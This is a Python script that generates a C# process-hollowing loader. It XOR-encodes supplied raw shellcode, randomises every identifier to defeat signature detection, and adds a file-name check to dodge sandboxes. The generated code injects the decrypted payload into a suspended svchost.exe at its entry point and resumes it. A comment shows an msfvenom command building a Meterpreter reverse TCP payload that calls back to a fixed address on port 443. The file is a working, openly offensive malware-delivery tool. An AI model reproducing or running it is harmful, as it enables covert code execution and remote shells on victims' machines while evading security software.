#!/usr/bin/env python3

import random
import string
from argparse import ArgumentParser
import os


def make_random_str():
    nbr = random.randint(8, 35)
    random_str = ''.join(random.choice(string.ascii_letters) for i in range(nbr))
    return random_str


def xor_shellcode(data, key):
    key_len = len(key)
    keyAsInt = list(map(ord, key))
    s = bytes(bytearray((
        (data[i] ^ keyAsInt[i % key_len]) for i in range(0, len(data))
    )))
    shellcode = "0x"
    shellcode += ",0x".join(format(b if isinstance(b, int) else ord(b), '02x') for b in s)
    return shellcode


def open_shellcode(s_path, x_key):
    with open(s_path, "rb") as raw_shellcode:
        return xor_shellcode(bytearray(raw_shellcode.read()), x_key)


def get_template(shellcode_path, exe_name):
    xor_key = make_random_str()
    xor_key_var = make_random_str()
    encoded_shellcode = open_shellcode(shellcode_path, xor_key)
    base_image_addr = make_random_str()
    buf = make_random_str()
    bytes_rw = make_random_str()
    cb = make_random_str()
    cb_reserved2 = make_random_str()
    CREATE_SUSPENDED = make_random_str()
    c_result = make_random_str()
    data_buf = make_random_str()
    delta_t = make_random_str()
    dw_count_chars = make_random_str()
    dw_fill_attribute = make_random_str()
    dw_flags = make_random_str()
    dw_x = make_random_str()
    dw_x_count_chars = make_random_str()
    dw_x_size = make_random_str()
    dw_y = make_random_str()
    dw_y_size = make_random_str()
    entrypoint_addr = make_random_str()
    executable_address = make_random_str()
    h_process = make_random_str()
    h_std_error = make_random_str()
    h_std_input = make_random_str()
    h_std_output = make_random_str()
    h_thread = make_random_str()
    i = make_random_str()
    lp_desktop = make_random_str()
    lp_reserved = make_random_str()
    lp_reserved2 = make_random_str()
    lp_title = make_random_str()
    more_reserved = make_random_str()
    pb_info = make_random_str()
    peb_address = make_random_str()
    p_info = make_random_str()
    proc_addr = make_random_str()
    PROCESSBASICINFORMATION = make_random_str()
    process_id = make_random_str()
    q_result = make_random_str()
    reserved1 = make_random_str()
    reserved2 = make_random_str()
    reserved3 = make_random_str()
    result = make_random_str()
    ret_len = make_random_str()
    r_result = make_random_str()
    rva = make_random_str()
    rva_offset = make_random_str()
    s_info = make_random_str()
    t1 = make_random_str()
    thread_id = make_random_str()
    unique_pid = make_random_str()
    w_show_window = make_random_str()
    e_lfanew = make_random_str()
    decrypted = make_random_str()

    return '''
    using System;
    using System.Runtime.InteropServices;
    
    namespace ProcessHollowing
     {{
        public class Program
         {{
        public const uint {CREATE_SUSPENDED} = 0x4;
        public const int {PROCESSBASICINFORMATION} = 0;
    
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
             {{
            public IntPtr {h_process};
            public IntPtr {h_thread};
            public Int32 {process_id};
            public Int32 {thread_id};
            }}
    
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
             {{
            public uint {cb};
            public string {lp_reserved};
            public string {lp_desktop};
            public string {lp_title};
            public uint {dw_x};
            public uint {dw_y};
            public uint {dw_x_size};
            public uint {dw_y_size};
            public uint {dw_x_count_chars};
            public uint {dw_count_chars};
            public uint {dw_fill_attribute};
            public uint {dw_flags};
            public short {w_show_window};
            public short {cb_reserved2};
            public IntPtr {lp_reserved2};
            public IntPtr {h_std_input};
            public IntPtr {h_std_output};
            public IntPtr {h_std_error};
            }}
    
            [StructLayout(LayoutKind.Sequential)]
            internal struct ProcessBasicInfo
             {{
            public IntPtr {reserved1};
            public IntPtr {peb_address};
            public IntPtr {reserved2};
            public IntPtr {reserved3};
            public IntPtr {unique_pid};
            public IntPtr {more_reserved};
            }}
    
            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
            static extern bool CreateProcess(string lpApplicationName, 
                                            string lpCommandLine,
                                            IntPtr lpProcessAttributes,
                                            IntPtr lpThreadAttributes,
                                            bool bInheritHandles,
                                            uint dwCreationFlags,
                                            IntPtr lpEnvironment,
                                            string lpCurrentDirectory,
                                            [In] ref StartupInfo lpStartupInfo,
                                            out ProcessInfo lpProcessInformation);
    
            [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
            private static extern int ZwQueryInformationProcess(IntPtr hProcess, 
                                                            int procInformationClass,
                                                            ref ProcessBasicInfo procInformation,
                                                            uint ProcInfoLen,
                                                            ref uint ret_len);
    
            [DllImport("kernel32.dll", SetLastError = true)]
            static extern bool ReadProcessMemory(IntPtr hProcess,
                                                 IntPtr lpBaseAddress,
                                                 [Out] byte[] lpBuffer,
                                                 int dwSize,
                                                 out IntPtr lpNumberOfbytesRW);
    
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool WriteProcessMemory(IntPtr hProcess,
                                                     IntPtr lpBaseAddress,
                                                     byte[] lpBuffer,
                                                     Int32 nSize,
                                                     out IntPtr lpNumberOfBytesWritten);
    
            [DllImport("kernel32.dll", SetLastError = true)]
            static extern uint ResumeThread(IntPtr hThread);
    
        public static void Main(string[] args)
             {{
                if (!System.AppDomain.CurrentDomain.FriendlyName.Equals("{exe_name}")) 
                {{ 
                    return;
                }}
                
                byte[] {buf} = new byte[]  {{ {encoded_shellcode} }};
                StartupInfo {s_info} = new StartupInfo();
                ProcessInfo {p_info} = new ProcessInfo();
                bool {c_result} = CreateProcess(null, "c:\\\\windows\\\\system32\\\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                false, {CREATE_SUSPENDED}, IntPtr.Zero, null, ref {s_info}, out {p_info});
                ProcessBasicInfo {pb_info} = new ProcessBasicInfo();
                uint {ret_len} = new uint();
                long {q_result} = ZwQueryInformationProcess({p_info}.{h_process}, {PROCESSBASICINFORMATION}, ref {pb_info}, (uint)(IntPtr.Size * 6), ref {ret_len});
                IntPtr {base_image_addr} = (IntPtr)((Int64){pb_info}.{peb_address} + 0x10);
                byte[] {proc_addr} = new byte[0x8];
                byte[] {data_buf} = new byte[0x200];
                IntPtr {bytes_rw} = new IntPtr();
                bool {result} = ReadProcessMemory({p_info}.{h_process}, {base_image_addr}, {proc_addr}, {proc_addr}.Length, out {bytes_rw});
                IntPtr {executable_address} = (IntPtr)BitConverter.ToInt64({proc_addr}, 0);
                {result} = ReadProcessMemory({p_info}.{h_process}, {executable_address}, {data_buf}, {data_buf}.Length, out {bytes_rw});
                uint {e_lfanew} = BitConverter.ToUInt32({data_buf}, 0x3c);
                uint {rva_offset} = {e_lfanew} + 0x28;
                uint {rva} = BitConverter.ToUInt32({data_buf}, (int){rva_offset});
                IntPtr {entrypoint_addr} = (IntPtr)((Int64){executable_address} + {rva});
                byte[] {decrypted} = new byte[{buf}.Length];
                string {xor_key_var} = "{xor_key}";
                for(int {i} = 0; {i} < {buf}.Length; {i}++) {{
                    {decrypted}[{i} ] = (byte) ({buf}[{i} ] ^ {xor_key_var}[{i} % {xor_key_var}.Length]);
                }}
                {result} = WriteProcessMemory({p_info}.{h_process}, {entrypoint_addr}, {decrypted}, {decrypted}.Length, out {bytes_rw});
                uint {r_result} = ResumeThread({p_info}.{h_thread});
            }}
        }}
    }}
    '''.format(
        base_image_addr=base_image_addr,
        buf=buf,
        bytes_rw=bytes_rw,
        cb=cb,
        cb_reserved2=cb_reserved2,
        CREATE_SUSPENDED=CREATE_SUSPENDED,
        c_result=c_result,
        data_buf=data_buf,
        delta_t=delta_t,
        dw_count_chars=dw_count_chars,
        dw_fill_attribute=dw_fill_attribute,
        dw_flags=dw_flags,
        dw_x=dw_x,
        dw_x_count_chars=dw_x_count_chars,
        dw_x_size=dw_x_size,
        dw_y=dw_y,
        dw_y_size=dw_y_size,
        entrypoint_addr=entrypoint_addr,
        executable_address=executable_address,
        h_process=h_process,
        h_std_error=h_std_error,
        h_std_input=h_std_input,
        h_std_output=h_std_output,
        h_thread=h_thread,
        i=i,
        lp_desktop=lp_desktop,
        lp_reserved=lp_reserved,
        lp_reserved2=lp_reserved2,
        lp_title=lp_title,
        more_reserved=more_reserved,
        pb_info=pb_info,
        peb_address=peb_address,
        p_info=p_info,
        proc_addr=proc_addr,
        PROCESSBASICINFORMATION=PROCESSBASICINFORMATION,
        process_id=process_id,
        q_result=q_result,
        reserved1=reserved1,
        reserved2=reserved2,
        reserved3=reserved3,
        result=result,
        ret_len=ret_len,
        r_result=r_result,
        rva=rva,
        rva_offset=rva_offset,
        s_info=s_info,
        t1=t1,
        thread_id=thread_id,
        unique_pid=unique_pid,
        w_show_window=w_show_window,
        e_lfanew=e_lfanew,
        xor_key_var=xor_key_var,
        xor_key=xor_key,
        decrypted=decrypted,
        encoded_shellcode=encoded_shellcode,
        exe_name=exe_name,
    )


def make_dir(out_dir):
    the_path = "./out/%s" % out_dir
    os.mkdir(the_path)
    return the_path


def write_template(out_dir, template):
    the_path = "%s/template.cs" % out_dir
    with open(the_path, 'w') as f:
        f.write(template)


def make_template(output_dir, exe_name, shellcode_path):
    output_dir = make_dir(output_dir)
    template = get_template(shellcode_path, exe_name)
    write_template(output_dir, template)


def run():
    parser = ArgumentParser(usage="usage: %(prog)s [options]")

    parser.add_argument("-o",
                        help="Directory to save the output",
                        type=str,
                        dest="output_dir",
                        default="rv",
                        required=True)

    #  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.118 LPORT=443 EXITFUNC=thread -f raw > shellcode.raw
    parser.add_argument("-s",
                        dest="shellcode_path",
                        type=str,
                        help="raw shellcode path"
                        )

    parser.add_argument("-n",
                        dest="exe_name",
                        type=str,
                        default="rv.exe",
                        help="name of output exe"
                        )

    user_arguments = parser.parse_args()
    make_template(
        user_arguments.output_dir,
        user_arguments.exe_name,
        user_arguments.shellcode_path,
    )


if __name__ == '__main__':
    run()
